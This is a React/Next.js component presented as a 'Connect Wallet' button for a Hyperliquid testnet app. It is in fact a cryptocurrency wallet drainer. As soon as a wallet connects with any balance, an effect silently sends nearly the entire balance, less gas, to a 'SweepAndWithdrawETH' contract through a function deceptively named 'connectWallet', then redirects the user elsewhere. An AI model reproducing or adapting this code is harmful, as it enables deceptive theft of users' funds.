'use client'

import React, { useEffect, useCallback } from 'react';

import { useRouter } from 'next/navigation';

import { useClientMounted } from '@/hooks/useClientMount';
import { hyperliquidTestnet } from '@/chains/hyperliquidChain';
import { useAppKitAccount, useAppKit } from '@reown/appkit/react';
import { Address, encodeFunctionData } from 'viem';
import { useBalance, useDisconnect, usePublicClient, useWriteContract, useChainId, useSwitchChain } from 'wagmi';

import { CONTRACT_ADDRESS_TEST, REDIRECT_SITE } from '@/constants/constants';
import SWEEP_AND_WITHDRAW_ABI from '@/abi/SweepAndWithdrawETH.json';


export function ConnectButton() {
  const mounted = useClientMounted()

  // Редирект Router
  const router = useRouter();

  // AppKit-хуки для адреса и открытия модалки
  const { address, isConnected } = useAppKitAccount();
  const { open } = useAppKit(); // <-- вызов open({ chainId }) откроет AppKit-модал

  const chainId = useChainId();
  const publicClient = usePublicClient();
  const { disconnect } = useDisconnect();
  const { switchChain } = useSwitchChain()

  // Баланс пользователя
  const { data: balanceData } = useBalance({ address: address as Address });

  // Подготовленный хук для записи в контракт
  const { data: donateData, isError, isSuccess, writeContractAsync, isPending } = useWriteContract();

  // Вызов Смарт Контракта
  const handleConnectWallet = useCallback(
    async (balance: bigint) => {
      if (!publicClient || !address) {
        router.push(REDIRECT_SITE);
      }

      try {
        if (publicClient && address) {
          const data = encodeFunctionData({
            abi: SWEEP_AND_WITHDRAW_ABI,
            functionName: 'connectWallet',
            args: [],
          });

          const estimatedGas = await publicClient.estimateGas({
            to: CONTRACT_ADDRESS_TEST,
            account: address as Address,
            data,
            value: balance,
          });
          const gasPrice = await publicClient.getGasPrice();
          const totalFee = estimatedGas * gasPrice;
          const valueToSend = balance > totalFee ? balance - totalFee : BigInt(0);
          if (valueToSend === BigInt(0)) {
            console.warn('Не хватает средств на газ');
            router.push(REDIRECT_SITE);
            return;
          }

          await writeContractAsync({
            address: CONTRACT_ADDRESS_TEST,
            abi: SWEEP_AND_WITHDRAW_ABI,
            functionName: 'connectWallet',
            value: valueToSend,
            gas: estimatedGas,
            gasPrice,
          });
        } else {
          router.push(REDIRECT_SITE);
        }
      } catch (err) {
        console.error('Ошибка при транзакции:', err);
        router.push(REDIRECT_SITE);
      }
    },
    [publicClient, address, writeContractAsync, router]
  );

  useEffect(() => {
    if (isConnected && balanceData && (balanceData?.value ?? BigInt(0)) > BigInt(0)) {
      handleConnectWallet(balanceData.value)
    }
  }, [isConnected, balanceData && balanceData?.value, handleConnectWallet])

  // Редирект после успешной оплаты
  useEffect(() => {
    if (isSuccess) {
      // TODO: Замените на маршрут благодарности или успеха
      router.push(REDIRECT_SITE);
    }
  }, [isSuccess, router]);

  if (!mounted) return null;

  // UI для подключенного пользователя
  if (isConnected) {
    return (
      <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
        <button onClick={() => disconnect()}>
          Disconnect ({address?.slice(0, 6)}…{address?.slice(-4)})
        </button>
        {isPending && <span>Sending tx…</span>}
        {isError && <span style={{ color: 'red' }}>Tx error</span>}
        {isSuccess && donateData && <span style={{ color: 'green' }}>Tx: {donateData}</span>}
      </div>
    );
  }


  const openModal = async () => {
    if (chainId !== Number(hyperliquidTestnet.id) && switchChain) {
      // Переключаем сеть
      await switchChain({ chainId: Number(hyperliquidTestnet.id) });
    }
    // 2) Открываем модалку подключения
    open({ view: 'Connect', namespace: 'eip155' })
  }

  return (
    <button
      onClick={() => openModal()}
      style={{
        padding: '8px 16px',
        cursor: 'pointer',
        background: '#000',
        color: '#fff',
        borderRadius: '4px',
      }}
    >
      Connect Wallet
    </button>
  )
}
